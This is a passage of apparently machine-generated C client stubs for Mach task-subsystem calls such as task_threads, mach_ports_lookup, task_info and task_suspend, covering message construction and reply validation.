	}

#if	__MigTypeCheck
	if (Out0P->act_list.type != MACH_MSG_OOL_PORTS_DESCRIPTOR ||
	    Out0P->act_list.disposition != 17) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */

#if __MigTypeCheck
	if (Out0P->act_list.count != Out0P->act_listCnt)
		return MIG_TYPE_ERROR;
#endif	/* __MigTypeCheck */

	return MACH_MSG_SUCCESS;
}
#endif /* !defined(__MIG_check__Reply__task_threads_t__defined) */
#endif /* __MIG_check__Reply__task_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine task_threads */
mig_external kern_return_t task_threads
(
	task_inspect_t target_task,
	thread_act_array_t *act_list,
	mach_msg_type_number_t *act_listCnt
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_ool_ports_descriptor_t act_list;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		mach_msg_type_number_t act_listCnt;
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_ool_ports_descriptor_t act_list;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		mach_msg_type_number_t act_listCnt;
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__task_threads_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__task_threads_t__defined */

	__DeclareSendRpc(3402, "task_threads")

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = target_task;
	InP->Head.msgh_id = 3402;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(3402, "task_threads")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(3402, "task_threads")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__task_threads_t__defined)
	check_result = __MIG_check__Reply__task_threads_t((__Reply__task_threads_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__task_threads_t__defined) */

	*act_list = (thread_act_array_t)(Out0P->act_list.address);
	*act_listCnt = Out0P->act_listCnt;

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__task_subsystem__
#if !defined(__MIG_check__Reply__mach_ports_register_t__defined)
#define __MIG_check__Reply__mach_ports_register_t__defined

mig_internal kern_return_t __MIG_check__Reply__mach_ports_register_t(__Reply__mach_ports_register_t *Out0P)
{

	typedef __Reply__mach_ports_register_t __Reply __attribute__((unused));
	if (Out0P->Head.msgh_id != 3503) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

#if	__MigTypeCheck
	if ((Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX) ||
	    (Out0P->Head.msgh_size != (mach_msg_size_t)sizeof(__Reply)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	{
		return Out0P->RetCode;
	}
}
#endif /* !defined(__MIG_check__Reply__mach_ports_register_t__defined) */
#endif /* __MIG_check__Reply__task_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine mach_ports_register */
mig_external kern_return_t mach_ports_register
(
	task_t target_task,
	mach_port_array_t init_port_set,
	mach_msg_type_number_t init_port_setCnt
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_ool_ports_descriptor_t init_port_set;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		mach_msg_type_number_t init_port_setCnt;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__mach_ports_register_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__mach_ports_register_t__defined */

	__DeclareSendRpc(3403, "mach_ports_register")

#if	UseStaticTemplates
	const static mach_msg_ool_ports_descriptor_t init_port_setTemplate = {
		/* addr = */		(void *)0,
		/* coun = */		0,
		/* deal = */		FALSE,
		/* copy is meaningful only in overwrite mode */
		/* copy = */		MACH_MSG_PHYSICAL_COPY,
		/* disp = */		19,
		/* type = */		MACH_MSG_OOL_PORTS_DESCRIPTOR,
	};
#endif	/* UseStaticTemplates */

	InP->msgh_body.msgh_descriptor_count = 1;
#if	UseStaticTemplates
	InP->init_port_set = init_port_setTemplate;
	InP->init_port_set.address = (void *)(init_port_set);
	InP->init_port_set.count = init_port_setCnt;
#else	/* UseStaticTemplates */
	InP->init_port_set.address = (void *)(init_port_set);
	InP->init_port_set.count = init_port_setCnt;
	InP->init_port_set.disposition = 19;
	InP->init_port_set.deallocate =  FALSE;
	InP->init_port_set.type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
#endif	/* UseStaticTemplates */


	InP->NDR = NDR_record;

	InP->init_port_setCnt = init_port_setCnt;

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits = MACH_MSGH_BITS_COMPLEX|
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = target_task;
	InP->Head.msgh_id = 3403;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(3403, "mach_ports_register")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(3403, "mach_ports_register")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__mach_ports_register_t__defined)
	check_result = __MIG_check__Reply__mach_ports_register_t((__Reply__mach_ports_register_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__mach_ports_register_t__defined) */

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__task_subsystem__
#if !defined(__MIG_check__Reply__mach_ports_lookup_t__defined)
#define __MIG_check__Reply__mach_ports_lookup_t__defined

mig_internal kern_return_t __MIG_check__Reply__mach_ports_lookup_t(__Reply__mach_ports_lookup_t *Out0P)
{

	typedef __Reply__mach_ports_lookup_t __Reply __attribute__((unused));
	boolean_t msgh_simple;
#if	__MigTypeCheck
	unsigned int msgh_size;
#endif	/* __MigTypeCheck */
	if (Out0P->Head.msgh_id != 3504) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

	msgh_simple = !(Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX);
#if	__MigTypeCheck
	msgh_size = Out0P->Head.msgh_size;

	if ((msgh_simple || Out0P->msgh_body.msgh_descriptor_count != 1 ||
	    msgh_size != (mach_msg_size_t)sizeof(__Reply)) &&
	    (!msgh_simple || msgh_size != (mach_msg_size_t)sizeof(mig_reply_error_t) ||
	    ((mig_reply_error_t *)Out0P)->RetCode == KERN_SUCCESS))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	if (msgh_simple) {
		return ((mig_reply_error_t *)Out0P)->RetCode;
	}

#if	__MigTypeCheck
	if (Out0P->init_port_set.type != MACH_MSG_OOL_PORTS_DESCRIPTOR ||
	    Out0P->init_port_set.disposition != 17) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */

#if __MigTypeCheck
	if (Out0P->init_port_set.count != Out0P->init_port_setCnt)
		return MIG_TYPE_ERROR;
#endif	/* __MigTypeCheck */

	return MACH_MSG_SUCCESS;
}
#endif /* !defined(__MIG_check__Reply__mach_ports_lookup_t__defined) */
#endif /* __MIG_check__Reply__task_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine mach_ports_lookup */
mig_external kern_return_t mach_ports_lookup
(
	task_t target_task,
	mach_port_array_t *init_port_set,
	mach_msg_type_number_t *init_port_setCnt
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_ool_ports_descriptor_t init_port_set;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		mach_msg_type_number_t init_port_setCnt;
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_ool_ports_descriptor_t init_port_set;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		mach_msg_type_number_t init_port_setCnt;
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__mach_ports_lookup_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__mach_ports_lookup_t__defined */

	__DeclareSendRpc(3404, "mach_ports_lookup")

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = target_task;
	InP->Head.msgh_id = 3404;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(3404, "mach_ports_lookup")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(3404, "mach_ports_lookup")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__mach_ports_lookup_t__defined)
	check_result = __MIG_check__Reply__mach_ports_lookup_t((__Reply__mach_ports_lookup_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__mach_ports_lookup_t__defined) */

	*init_port_set = (mach_port_array_t)(Out0P->init_port_set.address);
	*init_port_setCnt = Out0P->init_port_setCnt;

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__task_subsystem__
#if !defined(__MIG_check__Reply__task_info_t__defined)
#define __MIG_check__Reply__task_info_t__defined

mig_internal kern_return_t __MIG_check__Reply__task_info_t(__Reply__task_info_t *Out0P)
{

	typedef __Reply__task_info_t __Reply __attribute__((unused));
#if	__MigTypeCheck
	unsigned int msgh_size;
#endif	/* __MigTypeCheck */

	if (Out0P->Head.msgh_id != 3505) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

#if	__MigTypeCheck
	msgh_size = Out0P->Head.msgh_size;

	if ((Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX) ||
	    ((msgh_size > (mach_msg_size_t)sizeof(__Reply) || msgh_size < (mach_msg_size_t)(sizeof(__Reply) - 360)) &&
	     (msgh_size != (mach_msg_size_t)sizeof(mig_reply_error_t) ||
	      Out0P->RetCode == KERN_SUCCESS)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	if (Out0P->RetCode != KERN_SUCCESS) {
		return ((mig_reply_error_t *)Out0P)->RetCode;
	}

#if	__MigTypeCheck
	if ( Out0P->task_info_outCnt > 90 )
		return MIG_TYPE_ERROR;
	if (((msgh_size - (mach_msg_size_t)(sizeof(__Reply) - 360)) / 4< Out0P->task_info_outCnt) ||
	    (msgh_size != (mach_msg_size_t)(sizeof(__Reply) - 360) + Out0P->task_info_outCnt * 4))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

	return MACH_MSG_SUCCESS;
}
#endif /* !defined(__MIG_check__Reply__task_info_t__defined) */
#endif /* __MIG_check__Reply__task_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine task_info */
mig_external kern_return_t task_info
(
	task_name_t target_task,
	task_flavor_t flavor,
	task_info_t task_info_out,
	mach_msg_type_number_t *task_info_outCnt
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		task_flavor_t flavor;
		mach_msg_type_number_t task_info_outCnt;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_type_number_t task_info_outCnt;
		integer_t task_info_out[90];
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_type_number_t task_info_outCnt;
		integer_t task_info_out[90];
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__task_info_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__task_info_t__defined */

	__DeclareSendRpc(3405, "task_info")

	InP->NDR = NDR_record;

	InP->flavor = flavor;

	if (*task_info_outCnt < 90)
		InP->task_info_outCnt = *task_info_outCnt;
	else
		InP->task_info_outCnt = 90;

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = target_task;
	InP->Head.msgh_id = 3405;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(3405, "task_info")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(3405, "task_info")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__task_info_t__defined)
	check_result = __MIG_check__Reply__task_info_t((__Reply__task_info_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__task_info_t__defined) */

	if (Out0P->task_info_outCnt > *task_info_outCnt) {
		(void)memcpy((char *) task_info_out, (const char *) Out0P->task_info_out, 4 *  *task_info_outCnt);
		*task_info_outCnt = Out0P->task_info_outCnt;
		{ return MIG_ARRAY_TOO_LARGE; }
	}
	(void)memcpy((char *) task_info_out, (const char *) Out0P->task_info_out, 4 * Out0P->task_info_outCnt);

	*task_info_outCnt = Out0P->task_info_outCnt;

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__task_subsystem__
#if !defined(__MIG_check__Reply__task_set_info_t__defined)
#define __MIG_check__Reply__task_set_info_t__defined

mig_internal kern_return_t __MIG_check__Reply__task_set_info_t(__Reply__task_set_info_t *Out0P)
{

	typedef __Reply__task_set_info_t __Reply __attribute__((unused));
	if (Out0P->Head.msgh_id != 3506) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

#if	__MigTypeCheck
	if ((Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX) ||
	    (Out0P->Head.msgh_size != (mach_msg_size_t)sizeof(__Reply)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	{
		return Out0P->RetCode;
	}
}
#endif /* !defined(__MIG_check__Reply__task_set_info_t__defined) */
#endif /* __MIG_check__Reply__task_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine task_set_info */
mig_external kern_return_t task_set_info
(
	task_t target_task,
	task_flavor_t flavor,
	task_info_t task_info_in,
	mach_msg_type_number_t task_info_inCnt
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		task_flavor_t flavor;
		mach_msg_type_number_t task_info_inCnt;
		integer_t task_info_in[90];
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;
	unsigned int msgh_size;

#ifdef	__MIG_check__Reply__task_set_info_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__task_set_info_t__defined */

	__DeclareSendRpc(3406, "task_set_info")

	InP->NDR = NDR_record;

	InP->flavor = flavor;

	if (task_info_inCnt > 90) {
		{ return MIG_ARRAY_TOO_LARGE; }
	}
	(void)memcpy((char *) InP->task_info_in, (const char *) task_info_in, 4 * task_info_inCnt);

	InP->task_info_inCnt = task_info_inCnt;

	msgh_size = (mach_msg_size_t)(sizeof(Request) - 360) + ((4 * task_info_inCnt));
	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = target_task;
	InP->Head.msgh_id = 3406;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(3406, "task_set_info")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, msgh_size, (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(3406, "task_set_info")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__task_set_info_t__defined)
	check_result = __MIG_check__Reply__task_set_info_t((__Reply__task_set_info_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__task_set_info_t__defined) */

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__task_subsystem__
#if !defined(__MIG_check__Reply__task_suspend_t__defined)
#define __MIG_check__Reply__task_suspend_t__defined

mig_internal kern_return_t __MIG_check__Reply__task_suspend_t(__Reply__task_suspend_t *Out0P)
{

	typedef __Reply__task_suspend_t __Reply __attribute__((unused));
	if (Out0P->Head.msgh_id != 3507) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

#if	__MigTypeCheck
	if ((Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX) ||
	    (Out0P->Head.msgh_size != (mach_msg_size_t)sizeof(__Reply)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	{
		return Out0P->RetCode;
	}
}
#endif /* !defined(__MIG_check__Reply__task_suspend_t__defined) */
#endif /* __MIG_check__Reply__task_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine task_suspend */
mig_external kern_return_t task_suspend
(
	task_read_t target_task
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__task_suspend_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__task_suspend_t__defined */

	__DeclareSendRpc(3407, "task_suspend")

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = target_task;
	InP->Head.msgh_id = 3407;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(3407, "task_suspend")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(3407, "task_suspend")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__task_suspend_t__defined)
	check_result = __MIG_check__Reply__task_suspend_t((__Reply__task_suspend_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__task_suspend_t__defined) */

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__task_subsystem__
#if !defined(__MIG_check__Reply__task_resume_t__defined)
#define __MIG_check__Reply__task_resume_t__defined

mig_internal kern_return_t __MIG_check__Reply__task_resume_t(__Reply__task_resume_t *Out0P)
{

	typedef __Reply__task_resume_t __Reply __attribute__((unused));
	if (Out0P->Head.msgh_id != 3508) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

#if	__MigTypeCheck
	if ((Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX) ||
	    (Out0P->Head.msgh_size != (mach_msg_size_t)sizeof(__Reply)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	{
		return Out0P->RetCode;
	}
}
